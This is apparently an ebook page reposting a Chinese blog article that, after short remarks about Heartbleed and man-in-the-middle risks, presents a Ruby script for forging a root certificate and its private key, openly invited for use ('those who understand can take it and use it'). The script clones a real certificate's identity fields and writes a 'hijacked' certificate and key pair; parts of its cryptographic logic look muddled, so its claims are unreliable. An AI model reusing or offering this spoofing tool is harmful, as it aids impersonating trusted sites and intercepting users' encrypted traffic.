@@ -1,0 +1,54 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN"
+  "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<title>Ruby OpenSSL 私钥伪造脚本</title>
+<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
+</head>
+<body>
+<h1>Ruby OpenSSL 私钥伪造脚本</h1>
+<blockquote>原文：<a href="http://mp.weixin.qq.com/s?__biz=MjM5NjA0NjgyMA==&amp;mid=200147385&amp;idx=3&amp;sn=740c08e2de47df823d2fd3027989261d&amp;chksm=28f593321f821a24b8680953d38ec31c13fb3afb6475385d3be808f0c55eec23b7bdb8301882&amp;scene=27#wechat_redirect">http://mp.weixin.qq.com/s?__biz=MjM5NjA0NjgyMA==&amp;mid=200147385&amp;idx=3&amp;sn=740c08e2de47df823d2fd3027989261d&amp;chksm=28f593321f821a24b8680953d38ec31c13fb3afb6475385d3be808f0c55eec23b7bdb8301882&amp;scene=27#wechat_redirect</a></blockquote><p style="">前段时间的openssl  heartbleed 让我们心惊胆战的过了几天。<br style="margin: 0px; padding: 0px;"/></p><p style=""><br/></p><p style="">从用户数据泄露到 OpenSSL周边产品，从服务端到客户端， 从https 私钥泄露到 openvpn 、openssh 、sftp 等私钥泄露。很多地方我们无能为力。</p><p style=""><br/></p><p style="">太多的用户都认为https 就是安全的了， 在此之前也有各种各样的中间人攻击出现</p><p style=""><br/></p><p style="">下面我也贴段代码给大家看看。是 Ruby OpenSSL 的私钥伪造。</p><p style=""><br/></p><p style="">为了社会的和谐，具体用法我就不说了。能看懂的直接拿去用…</p><p style=""><br/></p><pre class="prettyprint lang-ruby prettyprinted" style="margin-top: 0px; margin-bottom: 0px; padding: 8px; background-color: rgb(247, 247, 249); border: 1px solid rgb(225, 225, 232); white-space: pre-wrap; word-break: break-all; word-wrap: break-word; color: rgb(102, 102, 102); font-size: 13px; line-height: 24px;">require 'rubygems'
+require 'openssl'
+require 'digest/md5'
+key = OpenSSL::PKey::RSA.new(2048)
+cipher = OpenSSL::Cipher::AES.new(256, :CBC)
+ctx = OpenSSL::SSL::SSLContext.new
+puts "Spoof must be in DER format and saved as root.cer"
+raw = File.read "root.cer"
+cert = OpenSSL::X509::Certificate.new raw
+cert.version = 2
+ef = OpenSSL::X509::ExtensionFactory.new
+ef.issuer_certificate = OpenSSL::X509::Certificate.new raw
+cert.subject = ef.issuer_certificate.subject
+ef.subject_certificate = ef.issuer_certificate
+cert.issuer = ef.issuer_certificate.issuer
+cert.serial = ef.issuer_certificate.serial
+ctx.key = ef.issuer_certificate.public_key
+cert.public_key = ef.issuer_certificate.public_key
+cert.not_after = ef.issuer_certificate.not_after
+cert.not_before = ef.issuer_certificate.not_before
+cert.extensions = ef.issuer_certificate.extensions
+a = File.open("root"".key", "w")
+a.syswrite("#{cert.public_key}")
+a.syswrite("#{key.to_pem}")
+spoof = OpenSSL::PKey::RSA.new File.read 'root.key'
+printf "Verifying Keys Work: "
+puts spoof.private?
+ctx.cert = ef.issuer_certificate
+puts "============================================================="
+root = ef.issuer_certificate.sign(spoof, OpenSSL::Digest::SHA1.new)
+filer = File.open("#{cert.serial}"".key", "w")
+filer.syswrite("#{spoof.to_pem}")
+file = File.open("spoof"".cer", "w")
+file.syswrite("#{cert.to_der}")
+files = File.open("#{cert.serial}"".pem", "w")
+files.syswrite("#{cert.to_pem}")
+files.syswrite("#{spoof.to_pem}")
+puts "Hijacked Certificate with chainloaded key saved @ #{cert.serial}.pem"
+printf "Verifying Keys Intergity: "
+puts root.verify(key)</pre><p style=""><br/></p><p style="">[Via http://www.pastebin.com/SQQXeAmF] </p><p style=""><br/></p><p style=""><img data-src="http://mmbiz.qpic.cn/mmbiz/qq5rfBadR38zYGLaVZics0memrgYajbkfW2clv2uXibLB5jOFMFVcceR5sV9YFytg0A9qzcqd0O6BoP7VfV1W8Gw/0" src="../Images/389dc9bad60211d1ad308a8b50a42e82.png" data-original-src="http://mmbiz.qpic.cn/mmbiz/qq5rfBadR38zYGLaVZics0memrgYajbkfW2clv2uXibLB5jOFMFVcceR5sV9YFytg0A9qzcqd0O6BoP7VfV1W8Gw/0"/></p><p><br/></p>
+        
+</body>
+</html>
